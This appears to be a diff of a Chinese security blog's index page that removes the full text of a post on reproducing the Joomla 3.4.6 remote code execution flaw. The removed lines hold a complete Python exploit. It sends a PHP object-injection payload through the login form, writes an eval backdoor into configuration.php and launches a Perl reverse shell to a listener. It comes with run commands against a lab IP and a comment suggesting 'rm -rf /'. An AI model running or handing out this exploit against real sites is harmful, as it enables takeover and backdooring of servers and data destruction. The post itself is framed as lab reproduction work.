@@ -344,7 +344,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.4k 字
+                  1.6k 字
                 </span>
               
 
@@ -360,7 +360,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  8 分钟
+                  9 分钟
                 </span>
               
             </div>
@@ -382,98 +382,17 @@
 
       
         
-          
-            <h4 id="Joomla简介"><a href="#Joomla简介" class="headerlink" title="Joomla简介"></a>Joomla简介</h4><p>1、Joomla是一套全球有名的CMS系统。</p>
+          <h4 id="Joomla简介"><a href="#Joomla简介" class="headerlink" title="Joomla简介"></a>Joomla简介</h4><p>1、Joomla是一套全球有名的CMS系统。</p>
 <p>2、Joomla基于PHP语言加上MySQL数据库所开发出来的WEB软件系统，目前最新版本是3.9.12。</p>
 <p>3、Joomla可以在多种不同的平台上部署并且运行。</p>
 <h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.0.0-3.4.6</span><br></pre></td></tr></table></figure>
-
-<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境下载：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://downloads.joomla.org/it/cms/joomla3/3-4-6</span><br></pre></td></tr></table></figure>
-
-<p>在Windows中使用phpstudy集成环境，把下载好的Joomla解压放进www中访问，正常安装即可<br>EXP下载地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/momika233/Joomla-3.4.6-RCE</span><br></pre></td></tr></table></figure>
-
-<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用脚本对网站进行验证，显示Vulnerable证明存在漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Joomla-3.4.6-RCE.py -t http://192.168.197.134/joomla/</span><br></pre></td></tr></table></figure>
-
-<p>![1](Joomla 3.4.6-RCE漏洞复现/1.png)</p>
-<p>设置监听后写入webs hell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Joomla-3.4.6-RCE.py -t http://192.168.197.134/joomla/ --exploit -l 192.168.197.152 -p 6666</span><br></pre></td></tr></table></figure>
-
-<p>![2](/Users/pingmao/Desktop/Joomla 3.4.6-RCE漏洞复现/2.png)</p>
-<p>漏洞位置在：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/configuration.php</span><br></pre></td></tr></table></figure>
-
-<p>网站目录中查看configuration.php我们可以看到已经写入webshell了</p>
-<p>![3](Joomla 3.4.6-RCE漏洞复现/3.png)</p>
-<p>使用蚁剑跟菜刀都可以连接，我这里用的是菜刀，密码:    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![4](Joomla 3.4.6-RCE漏洞复现/4.png)</span><br><span class="line"></span><br><span class="line">exp脚本</span><br></pre></td></tr></table></figure></p>
-<p>#!/usr/bin/env python3</p>
-<p>import requests<br>from bs4 import BeautifulSoup<br>from colorama import init<br>import sys<br>import string<br>import random<br>import argparse<br>from termcolor import colored</p>
-<p>init(autoreset=True)<br>PROXS = {‘http’:’127.0.0.1:8080’}<br>PROXS = {}</p>
-<p>def random_string(stringLength):<br>        letters = string.ascii_lowercase<br>        return ‘’.join(random.choice(letters) for i in range(stringLength))</p>
-<p>backdoor_param = random_string(50)</p>
-<p>def print_info(str):<br>        print(colored(“[*] “ + str,”cyan”))</p>
-<p>def print_ok(str):<br>        print(colored(“[+] “+ str,”green”))</p>
-<p>def print_error(str):<br>        print(colored(“[-] “+ str,”red”))</p>
-<p>def print_warning(str):<br>        print(colored(“[!!] “ + str,”yellow”))</p>
-<p>def get_token(url, cook):<br>        token = ‘’<br>        resp = requests.get(url, cookies=cook, proxies = PROXS)<br>        html = BeautifulSoup(resp.text,’html.parser’)<br>        # csrf token is the last input<br>        for v in html.find_all(‘input’):<br>                csrf = v<br>        csrf = csrf.get(‘name’)<br>        return csrf</p>
-<p>def get_error(url, cook):<br>        resp = requests.get(url, cookies = cook, proxies = PROXS)<br>        if ‘Failed to decode session object’ in resp.text:<br>                #print(resp.text)<br>                return False<br>        #print(resp.text)<br>        return True</p>
-<p>def get_cook(url):<br>        resp = requests.get(url, proxies=PROXS)<br>        #print(resp.cookies)<br>        return resp.cookies</p>
-<p>def gen_pay(function, command):<br>        # Generate the payload for call_user_func(‘FUNCTION’,’COMMAND’)<br>        template = ‘s:11:”maonnalezzo”:O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:FUNC_LEN:”FUNC_NAME”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:LENGTH:”PAYLOAD”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}’<br>        #payload =  command + ‘ || $a=&#39;<a href="http://wtf\&#39;;&#39;" target="_blank" rel="noopener">http://wtf\&#39;;&#39;</a><br>        payload =  ‘<a href="http://l4m3rz.l337/;&#39;" target="_blank" rel="noopener">http://l4m3rz.l337/;&#39;</a> + command<br>        # Following payload will append an eval() at the enabled of the configuration file<br>        #payload =  ‘file_put_contents(&#39;configuration.php&#39;,&#39;if(isset($_POST[\&#39;test\&#39;])) eval($_POST[\&#39;test\&#39;]);&#39;, FILE_APPEND) || $a=&#39;<a href="http://wtf\&#39;;&#39;" target="_blank" rel="noopener">http://wtf\&#39;;&#39;</a><br>        function_len = len(function)<br>        final = template.replace(‘PAYLOAD’,payload).replace(‘LENGTH’, str(len(payload))).replace(‘FUNC_NAME’, function).replace(‘FUNC_LEN’, str(len(function)))<br>        return final</p>
-<p>def make_req(url , object_payload):<br>        # just make a req with object<br>        print_info(‘Getting Session Cookie ..’)<br>        cook = get_cook(url)<br>        print_info(‘Getting CSRF Token ..’)<br>        csrf = get_token( url, cook)</p>
-<pre><code>user_payload = &apos;\\0\\0\\0&apos; * 9
-padding = &apos;AAA&apos; # It will land at this padding
-working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;}&apos;
-clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects
-
-inj_object = &apos;&quot;;&apos;
-inj_object += object_payload
-inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part
-password_payload = padding + inj_object
-params = {
-    &apos;username&apos;: user_payload,
-    &apos;password&apos;: password_payload,
-    &apos;option&apos;:&apos;com_users&apos;,
-    &apos;task&apos;:&apos;user.login&apos;,
-    csrf :&apos;1&apos;
-    }
-
-print_info(&apos;Sending request ..&apos;)
-resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
-return resp.text</code></pre><p>def get_backdoor_pay():<br>        # This payload will backdoor the the configuration .PHP with an eval on POST request</p>
-<pre><code>function = &apos;assert&apos;
-template = &apos;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}&apos;
-# payload =  command + &apos; || $a=\&apos;http://wtf\&apos;;&apos;
-# Following payload will append an eval() at the enabled of the configuration file
-payload =  &apos;file_put_contents(\&apos;configuration.php\&apos;,\&apos;if(isset($_POST[\\\&apos;&apos; + backdoor_param +&apos;\\\&apos;])) eval($_POST[\\\&apos;&apos;+backdoor_param+&apos;\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;;&apos;
-function_len = len(function)
-final = template.replace(&apos;PAYLOAD&apos;,payload).replace(&apos;LENGTH&apos;, str(len(payload))).replace(&apos;FUNC_NAME&apos;, function).replace(&apos;FUNC_LEN&apos;, str(len(function)))
-return final</code></pre><p>def check(url):<br>        check_string = random_string(20)<br>        target_url = url + ‘index.php/component/users’<br>        html = make_req(url, gen_pay(‘print_r’,check_string))<br>        if check_string in html:<br>                return True<br>        else:<br>                return False</p>
-<p>def ping_backdoor(url,param_name):<br>        res = requests.post(url + ‘/configuration.php’, data={param_name:’echo &#39;PWNED&#39;;’}, proxies = PROXS)<br>        if ‘PWNED’ in res.text:<br>                return True<br>        return False</p>
-<p>def execute_backdoor(url, payload_code):<br>        # Execute PHP code from the backdoor<br>        res = requests.post(url + ‘/configuration.php’, data={backdoor_param:payload_code}, proxies = PROXS)<br>        print(res.text)</p>
-<p>def exploit(url, lhost, lport):<br>        # Exploit the target<br>        # Default exploitation will append en eval function at the end of the configuration.pphp<br>        # as a bacdoor. btq if you do not want this use the funcction get_pay(‘php_function’,’parameters’)<br>        # e.g. get_payload(‘system’,’rm -rf /‘)</p>
-<pre><code># First check that the backdoor has not been already implanted
-target_url = url + &apos;index.php/component/users&apos;
-
-make_req(target_url, get_backdoor_pay())
-if ping_backdoor(url, backdoor_param):
-        print_ok(&apos;Backdoor implanted, eval your code at &apos; + url + &apos;/configuration.php in a POST with &apos; + backdoor_param)
-        print_info(&apos;Now it\&apos;s time to reverse, trying with a system + perl&apos;)
-        execute_backdoor(url, &apos;system(\&apos;perl -e \\\&apos;use Socket;$i=&quot;&apos;+ lhost +&apos;&quot;;$p=&apos;+ str(lport) +&apos;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\\\&apos;\&apos;);&apos;)</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>        parser = argparse.ArgumentParser()<br>        parser.add_argument(‘-t’,’–target’,required=True,help=’Joomla Target’)<br>        parser.add_argument(‘-c’,’–check’, default=False, action=’store_true’, required=False,help=’Check only’)<br>        parser.add_argument(‘-e’,’–exploit’,default=False,action=’store_true’,help=’Check and exploit’)<br>        parser.add_argument(‘-l’,’–lhost’, required=’–exploit’ in sys.argv, help=’Listener IP’)<br>        parser.add_argument(‘-p’,’–lport’, required=’–exploit’ in sys.argv, help=’Listener port’)<br>        args = vars(parser.parse_args())</p>
-<pre><code>url = args[&apos;target&apos;]
-if(check(url)):
-        print_ok(&apos;Vulnerable&apos;)
-        if args[&apos;exploit&apos;]:
-                exploit(url, args[&apos;lhost&apos;], args[&apos;lport&apos;])
-        else:
-                print_info(&apos;Use --exploit to exploit it&apos;)
-
-else:
-        print_error(&apos;Seems NOT Vulnerable ;/&apos;)</code></pre><p>```</p>
-<p>参考：<br><a href="https://github.com/momika233/Joomla-3.4.6-RCE" target="_blank" rel="noopener">https://github.com/momika233/Joomla-3.4.6-RCE</a><br><a href="https://www.anquanke.com/vul/id/1771843" target="_blank" rel="noopener">https://www.anquanke.com/vul/id/1771843</a></p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/10/10/Joomla-3-4-6-RCE漏洞复现/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2169,7 +2088,7 @@ else:
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">183.3k</span>
+    <span title="Site words total count">183.5k</span>
   
 </div>
 
